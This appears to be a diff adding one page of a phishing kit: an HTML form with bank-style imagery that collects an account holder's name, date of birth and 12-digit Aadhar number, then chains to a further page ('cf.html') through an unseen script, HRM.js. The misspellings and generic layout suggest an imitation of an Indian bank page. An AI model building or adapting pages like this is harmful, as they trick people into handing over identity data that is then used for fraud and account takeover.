@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="hy/P4RK.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
+    <title>Well Come </title>
+</head>
+
+<body>
+    <div id="__next">
+        
+        <div>
+            <img src="hy/header.jpg" width="100%">
+            <div>
+                <div>
+                    <input type="hidden" id="nextValue" value="cf.html">
+                    <form class="All_myfrm__3vXyb" id="frm_2_am8E_">
+                        <p class="All_mndt__6QZEJ">Required Fileds are asterisk (*)</p>
+                        <div class="All_frm__am8E_">
+                            <div class="All_frmgrp__Ym9Kf">
+                                <label class="All_frmlb__P0GlO">Account Holder Name <span class="All_mndt__6QZEJ">*</span></label>
+                                <input name="achname" type="text"  class="All_frmin__xQNbS" required=""></div>
+
+
+                            <div class="All_frmgrp__Ym9Kf">
+                                <label class="All_frmlb__P0GlO">Date Birth <span
+                                        class="All_mndt__6QZEJ">*</span></label><input name="Dob" type="text"
+                                    class="All_frmin__xQNbS" required="" id="dobInput" placeholder="DD/MM/YYYY" 
+                                    ></div>
+
+                            <div class="All_frmgrp__Ym9Kf">
+                                <label class="All_frmlb__P0GlO">Aadhar Number <span class="All_mndt__6QZEJ">*</span></label>
+                                <input name="adhnum" type="text" minlength="12" maxlength="12" inputmode="numeric"  class="All_frmin__xQNbS" required=""></div>
+                            <div class="All_ctr__36AKZ"><input type="submit" class="All_bts__Ls5Mq" value="Submit">
+                            </div>
+                        </div>
+                    </form>
+                    <div class="All_onbdy__lVkDe">
+                        <div class="All_onbdyi__trAIO">
+                            <img src="hy/footer1.jpg" width="100%">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <img src="hy/footer.jpg" width="100%" alt="">
+    </div>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+    <script src="hy/HRM.js"></script>
+    <script>
+        var cleave = new Cleave('#dobInput', {
+            date: true,
+            datePattern: ['d', 'm', 'Y']
+        });
+    </script>
+</body>
+
+</html>
